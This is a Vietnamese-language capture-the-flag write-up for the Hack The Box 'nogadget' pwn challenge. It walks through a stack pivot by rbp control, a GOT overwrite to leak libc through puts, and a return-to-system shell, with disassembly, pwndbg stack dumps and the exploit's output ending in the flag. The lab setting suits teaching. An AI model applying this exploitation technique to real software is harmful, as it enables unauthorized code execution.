# write up nogadget
- vì bài không cho gadget nhưng lại overwrite được got thì em sẽ overwrite got để leak libc 
- để overwrite được got thì cần có được rbp là 1 địa chỉ vùng got sao cho khi return về main thì địa chỉ fgets read vào đúng địa chỉ chứa got 
```assembly 
   0x0000000000401222 <+75>:	lea    rax,[rbp-0x80]
   0x0000000000401226 <+79>:	mov    esi,0x1337
   0x000000000040122b <+84>:	mov    rdi,rax
   0x000000000040122e <+87>:	call   0x401060 <fgets@plt>
```
- ở đây em overwrite got với gadget leave ret có sẵn
```assembly
   0x0000000000401233 <+92>:	lea    rax,[rbp-0x80]
   0x0000000000401237 <+96>:	mov    rdi,rax
   0x000000000040123a <+99>:	call   0x401040 <strlen@plt>
```
- mục đích là lợi dụng cái này vì nó dùng rbp-0x80 nên khi thay đổi rbp tại đúng vị trí thì khi nó thao tác rbp-0x80 rax sẽ chứa 1 địa chỉ plt khác chứa libc 
- vì vậy sau khi nó leave ret thì phải leave ret vào đúng địa chỉ khác chứa gadgets mà em setup sẵn để quay lại hàm main
```assembly

    ─────────────────────────────────────[ STACK ]─────────────────────────────────────
    00:0000│ rsp 0x404090 —▸ 0x40115d (__do_global_dtors_aux+29) ◂— pop rbp
    01:0008│     0x404098 —▸ 0x404458 —▸ 0x40123f (main+104) ◂— cmp rax, 80h
    02:0010│     0x4040a0 —▸ 0x401274 (main+157) ◂— leave 
    03:0018│     0x4040a8 —▸ 0x40115d (__do_global_dtors_aux+29) ◂— pop rbp
    04:0020│     0x4040b0 —▸ 0x404228 ◂— 0x6161616161616161 ('aaaaaaaa')
    05:0028│     0x4040b8 —▸ 0x40121b (main+68) ◂— mov rdx, qword ptr [rip + 2e2eh]
    ───────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────
     ► 0x401275 <main+158>    ret                                <__do_global_dtors_aux+29>

```
- đây chính là nơi mà nó return sau khi nhập nhập lần 3 để overwrite got vào strlen
- vì thế trước đó cần phải setup gadget vào nơi nó return ở lần 2 đảm bảo lần 3 không bị ngắt quãng từ đây
- vì thế đống gadget này chính là setup từ lần 2
- sau khi leave ret thì chưa có leak libc vì rbp chưa đúng, phải qua lần thứ 4 
- sau khi em buffer lần nữa thì 
```assembly
    pwndbg> tel 0x404ee8
    00:0000│ rax 0x404ee8 —▸ 0x40115d (__do_global_dtors_aux+29) ◂— pop rbp
    01:0008│-078 0x404ef0 —▸ 0x4044c0 ◂— 0x6161616161616161 ('aaaaaaaa')
    02:0010│-070 0x404ef8 —▸ 0x401233 (main+92) ◂— lea rax, [rbp - 80h]
    03:0018│-068 0x404f00 ◂— 0x6161616161616161 ('aaaaaaaa')
    04:0020│-060 0x404f08 ◂— 0x6161616161616161 ('aaaaaaaa')
    05:0028│-058 0x404f10 ◂— 0x6161616161616161 ('aaaaaaaa')
    06:0030│-050 0x404f18 ◂— 0x6161616161616161 ('aaaaaaaa')
    07:0038│-048 0x404f20 ◂— 0x6161616161616161 ('aaaaaaaa')
    pwndbg> 
    08:0040│-040 0x404f28 ◂— 0x6161616161616161 ('aaaaaaaa')
    09:0048│-038 0x404f30 ◂— 0x6161616161616161 ('aaaaaaaa')
    0a:0050│-030 0x404f38 ◂— 0x6161616161616161 ('aaaaaaaa')
    0b:0058│-028 0x404f40 ◂— 0x6161616161616161 ('aaaaaaaa')
    0c:0060│-020 0x404f48 ◂— 0x6161616161616161 ('aaaaaaaa')
    0d:0068│-018 0x404f50 ◂— 0x6161616161616161 ('aaaaaaaa')
    0e:0070│-010 0x404f58 ◂— 0x6161616161616161 ('aaaaaaaa')
    0f:0078│-008 0x404f60 ◂— 0x6161616161616161 ('aaaaaaaa')
    pwndbg> 
    10:0080│ rbp 0x404f68 ◂— 0x6161616161616161 ('aaaaaaaa')
    11:0088│+008 0x404f70 —▸ 0x40115d (__do_global_dtors_aux+29) ◂— pop rbp
    12:0090│+010 0x404f78 —▸ 0x404ee0 ◂— 0
    13:0098│+018 0x404f80 —▸ 0x401274 (main+157) ◂— leave 
    14:00a0│+020 0x404f88 ◂— 0xa /* '\n' */
    15:00a8│+028 0x404f90 ◂— 0
    16:00b0│+030 0x404f98 ◂— 0
    17:00b8│+038 0x404fa0 ◂— 0
    pwndbg> tel 0x4044c0-0x80
    00:0000│-b28 0x404440 —▸ 0x7ffff7c7f490 (fgets+144) ◂— mov edx, dword ptr [rbp]
```
- lúc này mới thực sự có libc, và chỉ cần return vào phần chương trình kia thì địa chỉ chứa libc sẽ được giữ trong rax cho tới khi chạy tiếp tới đây
```assembly
   0x0000000000401267 <+144>:	mov    rdi,rax
   0x000000000040126a <+147>:	call   0x401030 <puts@plt>
   0x000000000040126f <+152>:	mov    eax,0x0
   0x0000000000401274 <+157>:	leave
   0x0000000000401275 <+158>:	ret
```
- thì libc sẽ được leak ra
- sau khi quay lại main là có thế run gadgets từ libc và lấy shell

```bash
    [*] leak libc: 0x7ff0ceb20850
    [*] libc base: 0x7ff0cea95000
    [*] bin_sh: 0x7ff0cec6d698
    [*] system_libc: 0x7ff0ceae5d60
    [*] pop_rdi: 0x7ff0ceabf3e5

    [*] Switching to interactive mode

    $ ls
    flag.txt
    ld-2.35.so
    libc.so.6
    no_gadgets
    $ cat flag.txt
    HTB{wh0_n3eD5_rD1_wH3n_Y0u_h@v3_rBp!!!_92e0eb70ee6d530b2e6a4a8a230dc258}$ 
    [*] Interrupted
    [*] Closed connection to 94.237.61.244 port 39654
```
